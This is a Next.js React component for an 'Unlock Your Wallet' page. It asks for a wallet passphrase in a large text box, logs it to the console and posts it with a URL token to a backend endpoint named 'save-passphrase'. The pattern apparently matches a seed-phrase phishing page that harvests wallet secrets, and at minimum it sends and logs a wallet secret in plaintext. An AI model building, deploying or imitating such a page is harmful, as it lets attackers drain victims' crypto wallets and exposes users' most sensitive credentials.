"use client";

import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { Textarea } from "@/components/ui/textarea";
import { CustomButton } from "@/components/ui/button";  
import axios from "axios";

export default function UnlockWallet() {
  const [passphrase, setPassphrase] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);
  const [token, setToken] = useState<string | null>(null);
  const router = useRouter();
  const searchParams = useSearchParams();

  useEffect(() => {
    const extractedToken = searchParams.get("token");
    console.log("Current URL:", window.location.href);
    console.log("Extracted Token:", extractedToken);

    if (extractedToken) {
      setToken(extractedToken);
    } else {
      setError("Invalid or missing token");
    }
  }, [searchParams]);

  const API_BASE_URL = process.env.NEXT_PUBLIC_BACKEND_URL || "http://localhost:8080";

  const handleUnlock = async () => {
    console.log("Submitting with Token:", token);
    console.log("Submitting with Passphrase:", passphrase);

    if (!token) {
      setError("Token is missing");
      return;
    }

    if (!passphrase.trim()) {
      setError("Please enter your passphrase");
      return;
    }

    setError(null);
    setSuccess(null);

    try {
      const response = await axios.post(
        `${API_BASE_URL}/api/wallet/save-passphrase?token=${token}`, 
        { passphrase }, 
        { headers: { "Content-Type": "application/json" } }
      );

      console.log("✅ API Response:", response.data);
      setSuccess(response.data.message);
      // setTimeout(() => router.push("/wallet-dashboard"), 2000);
    } catch (error: any) {
      console.error("API Error:", error);
      setError(error.response?.data?.message || "Failed to unlock wallet");
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white items-center justify-center p-6">
      <h1 className="text-2xl font-bold mb-4">Unlock Your Wallet</h1>

      <Textarea
        placeholder="Enter your passphrase"
        value={passphrase}
        onChange={(e) => setPassphrase(e.target.value)}
        className="min-h-[200px] border border-gray-300 rounded-md p-4 resize-none w-full max-w-md"
      />

      {error && <p className="text-red-500 mt-2">{error}</p>}
      {success && <p className="text-green-500 mt-2">{success}</p>}

      <CustomButton
        onClick={handleUnlock}
        className="w-full max-w-md bg-purple-700 hover:bg-purple-800 text-white font-bold py-3 mt-4 rounded-lg"
      >
        Unlock Wallet
      </CustomButton>
    </div>
  );
}
